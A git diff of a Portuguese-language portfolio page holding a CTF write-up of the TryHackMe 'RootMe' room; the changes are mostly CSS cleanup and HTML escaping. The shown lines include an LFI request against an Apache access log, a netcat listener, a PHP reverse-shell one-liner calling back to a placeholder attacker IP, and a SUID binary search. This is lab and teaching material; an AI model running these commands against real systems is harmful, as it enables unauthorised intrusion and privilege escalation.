@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>Writeup — RootMe (TryHackMe) | Wilton Lima</title>
 
   <!-- Font Awesome & AOS -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
-  <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css">
 
   <!-- Estilos do site (mesmo style.css do seu portfólio) -->
-  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
@@ -49,9 +49,9 @@
         Nesta página descrevo o processo de reconhecimento, exploração, escalada de privilégios e evidências.
         Use este modelo como referência e modifique conforme suas notas.
       </p>
-      <div style="text-align:center; margin-top:14px;">
-        <a href="ctfs.html" class="btn-primary" style="display:inline-block;">Voltar para CTFs</a>
-        <a href="#" class="btn-primary" style="display:inline-block; margin-left:10px;">Baixar PDF</a>
+      <div class="writeup-actions">
+        <a href="ctfs.html" class="btn-primary">Voltar para CTFs</a>
+        <a href="#" class="btn-primary">Baixar PDF</a>
       </div>
     </div>
   </header>
@@ -59,17 +59,17 @@
   <!-- METADADOS -->
   <section class="section" data-aos="fade-up">
     <div class="container">
-      <div class="project-meta" style="display:flex;flex-wrap:wrap;gap:14px;align-items:center;">
-        <div style="background:#f7f9fc;padding:10px;border-radius:12px;border:1px solid #eee;">
-          <strong>Status:</strong> <span style="color:#16a34a;">Concluído</span>
+      <div class="project-meta">
+        <div class="meta-item">
+          <strong>Status:</strong> <span class="status-completed">Concluído</span>
         </div>
-        <div style="background:#f7f9fc;padding:10px;border-radius:12px;border:1px solid #eee;">
+        <div class="meta-item">
           <strong>Plataforma:</strong> TryHackMe
         </div>
-        <div style="background:#f7f9fc;padding:10px;border-radius:12px;border:1px solid #eee;">
-          <strong>Data:</strong> <!-- preencha --> 2025-10-19
+        <div class="meta-item">
+          <strong>Data:</strong> 2025-10-19
         </div>
-        <div style="background:#f7f9fc;padding:10px;border-radius:12px;border:1px solid #eee;">
+        <div class="meta-item">
           <strong>Tags:</strong> Web, LFI, Shell, Escalada
         </div>
       </div>
@@ -132,7 +132,7 @@ http://10.10.X.X/index.php?page=/var/log/apache2/access.log
 nc -lvnp 4444
 
 # do servidor (payload PHP)
-php -r '$sock=fsockopen("10.10.Y.Y",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.Y.Y",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
 </code></pre>
 
       <p>Depois de estabilizar o shell, coletei informações locais:</p>
@@ -151,7 +151,7 @@ cat /etc/issue
 
       <p>Procurei por binários SUID, serviços configurados incorretamente e arquivos com credenciais:</p>
 
-      <pre><code>find / -perm -4000 -type f 2>/dev/null
+      <pre><code>find / -perm -4000 -type f 2&gt;/dev/null
 sudo -l
 ps aux --forest
 </code></pre>
@@ -170,7 +170,7 @@ cat /root/root.txt
   <!-- FLAGS & EVIDÊNCIAS -->
   <section class="section" data-aos="fade-up">
     <div class="container">
-      <h2 class="section-subtitle"><i class="fa-solid fa-flag"></i> Flags & Evidências</h2>
+      <h2 class="section-subtitle"><i class="fa-solid fa-flag"></i> Flags &amp; Evidências</h2>
 
       <p>Flags encontradas:</p>
       <ul>
@@ -190,7 +190,7 @@ cat /root/root.txt
   <!-- REMEDIAÇÃO E CONCLUSÕES -->
   <section class="section" data-aos="fade-up">
     <div class="container">
-      <h2 class="section-subtitle"><i class="fa-solid fa-wrench"></i> Remediação & Conclusão</h2>
+      <h2 class="section-subtitle"><i class="fa-solid fa-wrench"></i> Remediação &amp; Conclusão</h2>
 
       <p><strong>Remediação recomendada:</strong></p>
       <ul>
@@ -218,9 +218,9 @@ cat /root/root.txt
 
   <!-- BOTÕES RÁPIDOS -->
   <section class="section" data-aos="fade-up">
-    <div class="container" style="text-align:center;">
+    <div class="container writeup-actions">
       <a href="ctfs.html" class="btn-primary">Voltar para CTFs</a>
-      <a href="projetos.html" class="btn-primary" style="margin-left:10px;">Ver Projetos</a>
+      <a href="projetos.html" class="btn-primary">Ver Projetos</a>
     </div>
   </section>
 
